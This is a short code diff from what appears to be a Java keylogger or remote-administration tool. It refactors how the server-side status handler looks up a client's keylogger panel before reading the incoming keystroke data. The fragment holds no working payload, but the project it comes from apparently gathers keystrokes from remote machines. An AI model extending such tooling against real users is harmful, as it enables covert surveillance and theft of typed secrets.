@@ -12,7 +12,7 @@ public class PacketStatus extends PacketListener {
 		try {
 			int len = client.getDataInputStream().readInt();
 			
-			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.getInstances().get(client.getIP());
+			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.get(client);
 			
 			for (int i = 0; i < len; i++) {
 				boolean isKey = client.getDataInputStream().readBoolean();
